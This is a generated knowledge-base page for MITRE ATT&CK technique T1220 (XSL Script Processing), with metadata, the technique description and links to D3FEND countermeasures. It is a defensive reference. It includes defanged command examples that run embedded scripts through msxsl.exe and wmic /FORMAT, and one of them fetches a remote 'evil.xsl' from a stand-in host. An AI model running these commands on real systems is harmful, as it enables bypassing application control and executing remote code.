---
mitre_id: "T1220"
mitre_name: "XSL Script Processing"
mitre_type: "attack-pattern"
mitre_stix_id: "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3"
mitre_created: "2018-10-17T00:14:20.652Z"
mitre_modified: "2025-10-24T17:49:33.993Z"
mitre_version: "1.3"
mitre_domains:
  - "enterprise-attack"
mitre_url: "https://attack.mitre.org/techniques/T1220/"
framework: "attack"
generated: "true"
build_date: "2026-04-26 13:08:46"
build_source: "script"
object_type: "technique"
mitre_is_subtechnique: "False"
mitre_platforms:
  - "Windows"
mitre_tactic_ids:
  - "TA0005"
d3fend_ids:
  - "D3-CF"
  - "D3-CM"
  - "D3-CQ"
  - "D3-DA"
  - "D3-DF"
  - "D3-EAL"
  - "D3-EDL"
  - "D3-EFA"
  - "D3-FA"
  - "D3-FE"
  - "D3-FEV"
  - "D3-FIM"
  - "D3-HBPI"
  - "D3-LFP"
  - "D3-PSA"
  - "D3-RF"
  - "D3-RFAM"
  - "D3-SCA"
  - "D3-SCF"
tags:
  - "attack"
  - "technique"
  - "offense"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[workspaces/index|Notes]]

---

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [[T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]], the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* `msxsl.exe customers[.]xml script[.]xsl`
* `msxsl.exe script[.]xsl script[.]xsl`
* `msxsl.exe script[.]jpeg script[.]jpeg`

Another variation of this technique, dubbed “Squiblytwo”, involves using [[T1047-windows_management_instrumentation|T1047: Windows Management Instrumentation]] to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [[T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [[T1047-windows_management_instrumentation|T1047: Windows Management Instrumentation]] provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: `wmic process list /FORMAT:evil[.]xsl`
* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`

## Workspace

- [[workspaces/attack/techniques/T1220-xsl_script_processing-note|Open workspace note]]

![[workspaces/attack/techniques/T1220-xsl_script_processing-note]]

## Tactics

- [[TA0005-defense_evasion|TA0005: Defense Evasion]]

## D3FEND

- [[D3-CF-content_filtering|D3-CF: Content Filtering]]
- [[D3-CM-content_modification|D3-CM: Content Modification]]
- [[D3-CQ-content_quarantine|D3-CQ: Content Quarantine]]
- [[D3-DA-dynamic_analysis|D3-DA: Dynamic Analysis]]
- [[D3-DF-decoy_file|D3-DF: Decoy File]]
- [[D3-EAL-executable_allowlisting|D3-EAL: Executable Allowlisting]]
- [[D3-EDL-executable_denylisting|D3-EDL: Executable Denylisting]]
- [[D3-EFA-emulated_file_analysis|D3-EFA: Emulated File Analysis]]
- [[D3-FA-file_analysis|D3-FA: File Analysis]]
- [[D3-FE-file_encryption|D3-FE: File Encryption]]
- [[D3-FEV-file_eviction|D3-FEV: File Eviction]]
- [[D3-FIM-file_integrity_monitoring|D3-FIM: File Integrity Monitoring]]
- [[D3-HBPI-hardware-based_process_isolation|D3-HBPI: Hardware-based Process Isolation]]
- [[D3-LFP-local_file_permissions|D3-LFP: Local File Permissions]]
- [[D3-PSA-process_spawn_analysis|D3-PSA: Process Spawn Analysis]]
- [[D3-RF-restore_file|D3-RF: Restore File]]
- [[D3-RFAM-remote_file_access_mediation|D3-RFAM: Remote File Access Mediation]]
- [[D3-SCA-system_call_analysis|D3-SCA: System Call Analysis]]
- [[D3-SCF-system_call_filtering|D3-SCF: System Call Filtering]]

## Mitigations

- [[M1038-execution_prevention|M1038: Execution Prevention]]

## Platforms

- Windows

